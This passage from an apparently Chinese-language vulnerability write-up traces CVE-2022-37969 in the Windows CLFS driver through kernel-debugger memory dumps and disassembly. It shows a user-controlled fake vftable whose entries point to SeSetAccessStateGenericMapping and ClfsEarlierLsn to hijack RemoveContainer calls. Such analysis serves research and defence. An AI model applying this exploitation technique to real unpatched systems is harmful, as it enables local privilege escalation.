</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de4f8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de508  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de518  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de528  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de538  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de548  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span></code></pre></div><p>获取<code>pContainer</code>指针，并尝试解引用pContainer获取到<code>CClfsContainer</code>对象，而后调用对象的指针</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/15.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ebf <span style=color:#ae81ff>498</span>b7f18           mov     rdi, qword ptr [r15<span style=color:#f92672>+</span><span style=color:#ae81ff>18</span>h]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ec3 <span style=color:#ae81ff>4885ff</span>             test    rdi, rdi
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ec6 <span style=color:#ae81ff>0f</span><span style=color:#ae81ff>84</span>b9000000       je      CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1d5</span> (fffff80011306f85)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ecc <span style=color:#ae81ff>4983671800</span>         and     qword ptr [r15<span style=color:#f92672>+</span><span style=color:#ae81ff>18</span>h], <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ed1 <span style=color:#ae81ff>65488</span>b142588010000 mov     rdx, qword ptr gs:[<span style=color:#ae81ff>188</span>h]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>eda <span style=color:#ae81ff>488</span>b4e20           mov     rcx, qword ptr [rsi<span style=color:#f92672>+</span><span style=color:#ae81ff>20</span>h]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ede <span style=color:#ae81ff>4</span>c8b15c3d1ffff     mov     r10, qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>__imp_ExReleaseResourceForThreadLite</span> (fffff800113040a8)]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ee5 e8a655c203         call    ntkrnlmp<span style=color:#f92672>!</span><span style=color:#a6e22e>ExReleaseResourceForThreadLite</span> (fffff80014f2c490)
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>eea <span style=color:#ae81ff>4532f</span><span style=color:#ae81ff>6</span>             xor     r14b, r14b
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>eed <span style=color:#ae81ff>4488742420</span>         mov     byte ptr [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>20</span>h], r14b
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ef2 <span style=color:#ae81ff>488</span>b07             mov     rax, qword ptr [rdi]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ef5 <span style=color:#ae81ff>488</span>b4018           mov     rax, qword ptr [rax<span style=color:#f92672>+</span><span style=color:#ae81ff>18</span>h]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ef9 <span style=color:#ae81ff>488</span>bcf             mov     rcx, rdi
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>efc ff15ced6ffff       call    qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>__guard_dispatch_icall_fptr</span> (fffff800113045d0)]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306f</span><span style=color:#ae81ff>02</span> <span style=color:#ae81ff>488</span>b07             mov     rax, qword ptr [rdi]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306f</span><span style=color:#ae81ff>05</span> <span style=color:#ae81ff>488</span>b4008           mov     rax, qword ptr [rax<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306f</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>488</span>bcf             mov     rcx, rdi
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306f</span><span style=color:#ae81ff>0</span>c ff15bed6ffff       call    qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>__guard_dispatch_icall_fptr</span> (fffff800113045d0)]
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db r15
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de4d8  <span style=color:#ae81ff>08</span> f0 fd c1 <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#ae81ff>.0</span>...........
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de4e8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>a0 <span style=color:#ae81ff>93</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ..........P.....
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de4f8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de508  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de518  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de528  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de538  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de548  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> p
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x113</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>11306</span>ec3 <span style=color:#ae81ff>4885ff</span>          test    rdi,rdi
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> rrdi
</span></span><span style=display:flex><span>rdi<span style=color:#f92672>=</span><span style=color:#ae81ff>000000000050</span><span style=color:#ae81ff>93</span>a0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dp rdi
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>93</span>a0  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>93</span>b0  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>93</span>c0  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>93</span>d0  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>005093e0</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>005093f</span><span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9400</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0050</span><span style=color:#ae81ff>9410</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span> ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c018
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dq <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span>  <span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23456789</span> fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da0
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000010</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb0
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000020</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000030</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000040</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000050</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000060</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000070</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><p>该对象已经被用户层控制，<code>CClfsContainer</code>的vftable被指向05000000</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/16.png></p><p>在05000000+0x8和05000000+0x18处的两个函数指针分别是<code>SeSetAccessStateGenericMapping</code>和<code>ClfsEarlierLsn</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dq <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span>  <span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23456789</span> fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da0
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000010</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb0
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000020</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000030</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000040</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000050</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000060</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000070</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> u fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da0
</span></span><span style=display:flex><span>nt<span style=color:#f92672>!</span>SeSetAccessStateGenericMapping:
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da0 <span style=color:#ae81ff>488</span>b4148        mov     rax,qword ptr [rcx<span style=color:#f92672>+</span><span style=color:#ae81ff>48</span>h]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da4 <span style=color:#ae81ff>0f</span><span style=color:#ae81ff>1002</span>          movups  xmm0,xmmword ptr [rdx]
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>da7 f30f7f4008      movdqu  xmmword ptr [rax<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>],xmm0
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>dac c3              ret
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>dad cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>dae cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>daf cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>151f</span><span style=color:#ae81ff>2</span>db0 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> u fffff800<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>112f</span><span style=color:#ae81ff>1</span>cb0
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn:
